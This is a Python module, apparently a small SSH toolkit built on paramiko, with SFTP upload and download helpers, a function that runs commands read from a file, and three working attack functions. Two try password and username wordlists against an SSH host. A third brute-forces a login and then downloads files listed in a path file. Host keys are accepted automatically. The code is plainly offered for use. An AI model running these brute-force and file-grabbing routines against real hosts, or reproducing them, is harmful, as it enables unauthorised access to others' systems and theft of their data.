"""
os module provides a portable way of using operating system dependent functionality.
importing time to be able to sleep the program and wait if needed.
importing paramiko to handle SSH connections.
"""
import os
import time
import paramiko
import paramiko.ssh_exception

def ssh_upload(ip, user, password, local_files, remote_path, all_files=False):
    """   
    Uploads an entire directory or specified file.
    To upload an entire directory set all_files=True and:
        remote_path = "/Path/to/remote/dir
        local_path = "/Path/to/local/dir
    
    To upload a single file (e.g .txt files):
        remote_path = "/Path/to/filename.txt
        local_path = "/Path/to/save/filename.txt
    """
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())#Accepts host key

    def upload_files(local_dir, remote_dir): #To upload an entire folder and subfolders.
        try:
            sftp.mkdir(remote_dir)
        except IOError:#If the folder already exists it wont make a new one.
            pass

        for file in os.listdir(local_dir):
            local_path = os.path.join(local_dir, file)
            remote_path = os.path.join(remote_dir, file).replace("\\", "/")

            if os.path.isdir(local_path): #recursive incase of subfolders.
                upload_files(local_path, remote_path)
            else:
                sftp.put(local_path, remote_path)
                print(f"The file: {local_path} has been uploaded to {remote_path}")

    try:
        ssh.connect(ip, username=user, password=password)
        print(f"Connected to {ip} as {user}")

        sftp = ssh.open_sftp()
        if all_files:#Calls entire_dir and uploads everything in that dir
            upload_files(local_files, remote_path)
        else:
            sftp.put(local_files, remote_path)
            print(f"The file: {local_files} has been uploaded to {remote_path}")

        sftp.close()

    except paramiko.AuthenticationException:
        print("Failed to authenticate")
    except Exception as e:
        print(f"Error: {e}")
    finally:
        ssh.close()

def ssh_download(ip, user, password, local_path, remote_path, all_files=False):
    """
    Downloads an entire directory or specified file.
    To download an entire directory set all_files=True and:
        remote_path = "/Path/to/remote/dir
        local_path = "/Path/to/local/dir
    
    To download a single file (e.g .txt files):
        remote_path = "/Path/to/filename.txt
        local_path = "/Path/to/save/filename.txt
    """
    ssh = paramiko.SSHClient()

    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    def download_files(local_dir, remote_dir): #Downloads everything in remote_path
        try:
            os.mkdir(local_dir)
        except OSError:#If the folder already exists it wont make a new one.
            pass

        for file in sftp.listdir_attr(remote_dir):
            remote_file_path = os.path.join(remote_dir, file.filename).replace("\\", "/")
            local_file_path = os.path.join(local_dir, file.filename)
            try:
                sftp.listdir(remote_file_path)
                download_files(local_file_path, remote_file_path)
            except IOError:
                sftp.get(remote_file_path, local_file_path)
                print(f"The file: {remote_file_path} has been downloaded to {local_file_path}")

    try:
        ssh.connect(ip, username=user, password=password)
        print(f"Connected to {ip} as {user}")

        sftp = ssh.open_sftp()
        if all_files:#Downloads the entire dir if all_files=True
            download_files(local_path, remote_path)
        # elif sftp.listdir(remote_path):
        #     print(f"{remote_path} is a folder!")
        else:
            sftp.get(remote_path, local_path)
            print(f"The file {remote_path} has been downloaded to {local_path}")

        sftp.close()

    except paramiko.AuthenticationException:
        print("Failed to authenticate")
    except Exception as e:
        print(f"Error: {e}")
    finally:
        ssh.close()

def ssh_brute_password(ip, username, password_file):
    """
    Bruteforcing an ssh connection with passwords from a file
    """
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    if os.path.exists(password_file):
        with open(password_file, 'r', encoding='UTF-8') as file:
            passwords = file.read().splitlines()
        print(f"Trying to bruteforce password on {ip} as {username}")

        for password in passwords:
            try:
                print(f"Trying {username}-{password}")
                ssh.connect(ip, username=username, password=password)
                print('\n----------------------------')
                print(f"Successful login with {username}-{password}")
                print('----------------------------\n')
                ssh.close()
                break

            except paramiko.AuthenticationException:
                print(f"Failed with {username} - {password}")
                print('----------------------------')

            except Exception as e:
                print(f"Error: {e}")

            finally:
                ssh.close()

            time.sleep(0.5)
    else:
        print(f"File: {password_file} Does not exist")

def ssh_brute_user_password(ip, username_file, password_file):
    """
    Bruteforcing ssh connection with usernames and passwords from files
    """
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        with open(password_file, 'r', encoding='UTF-8') as password_file:
            passwords = password_file.read().splitlines()

        with open(username_file, 'r', encoding='UTF-8') as user_file:
            users = user_file.read().splitlines()

        print(f"Trying to bruteforce username and password on {ip}")
        for user in users:
            connection = False
            for password in passwords:
                try:
                    print(f"Trying {user}-{password}")
                    ssh.connect(ip, username=user, password=password)
                    print('\n----------------------------')
                    print(f"Successful login with {user}-{password}")
                    print('----------------------------\n')
                    ssh.close()
                    connection = True
                    break

                except paramiko.AuthenticationException:
                    print(f"Failed with {user} - {password}")
                    print('----------------------------')

                except Exception as e:
                    print(f"Error: {e}")

                finally:
                    ssh.close()

                time.sleep(0.5)
            if connection:
                break

    except FileNotFoundError as e:
        print(f"Error: {e}")

def ssh_brute_grab(ip, username, password_file, local_path, remote_path):
    """
    Bruteforcing an ssh connection with passwords from a file and downloads
    files from directories provided from a file.
    """
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    def grab(local_path, remote_path):
        if os.path.exists(remote_path):
            with open(remote_path, 'r', encoding='UTF-8') as path_file:
                remote_path = path_file.read().splitlines()

                for path in remote_path:
                    path = path.strip()
                    if not path:
                        continue
                    try:
                        sftp.stat(path) # Raises IOError if the file does not exist
                        path_file = path.split('/')[-1]
                        local_file = os.path.join(local_path, path_file)
                        sftp.get(path, local_file)
                        print(f'Downloaded {path} to {local_file}')

                    except IOError as e:
                        print(f"Error: Could not download {path}. Reason: {e}")
        else:
            print(f"Cannot find {remote_path}")

    if os.path.exists(password_file):
        with open(password_file, 'r', encoding='UTF-8') as file:
            passwords = file.read().splitlines()
        print(f"Trying to bruteforce password on {ip} as {username}")

        for password in passwords:
            try:
                print(f"Trying {username}-{password}")
                ssh.connect(ip, username=username, password=password)
                print('\n----------------------------')
                print(f"Successful login with {username}-{password}")
                print('----------------------------\n')

                sftp = ssh.open_sftp()
                grab(local_path, remote_path)
                sftp.close()
                ssh.close()
                break

            except paramiko.AuthenticationException:
                print(f"Failed with {username} - {password}")
                print('----------------------------')

            except Exception as e:
                print(f"Error: {e}")
                break
            finally:
                ssh.close()

            time.sleep(0.5)
    else:
        print(f"File: {password_file} Does not exist")

def ssh_commands(ip, user, password, commands):
    """
    Connect via ssh and then use commans submitted from a file
    """
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    if os.path.exists(commands):
        with open(commands, 'r', encoding='UTF-8') as file:
            commands = file.read().splitlines()

            try:
                ssh.connect(ip, username=user, password=password)
                print(f"Connected to {ip} as {user}")

                for command in commands:
                    stdin, stdout, stderr = ssh.exec_command(command)

                    output = stdout.read().decode()
                    error = stderr.read().decode()

                    if output:
                        print(output)
                    if error:
                        print(f"Error: {error}")

            except paramiko.AuthenticationException:
                print("Failed to authenticate")
            except Exception as e:
                print(f"Error: {e}")
            finally:
                ssh.close()
    else:
        print(f"Cannot find file {commands}")
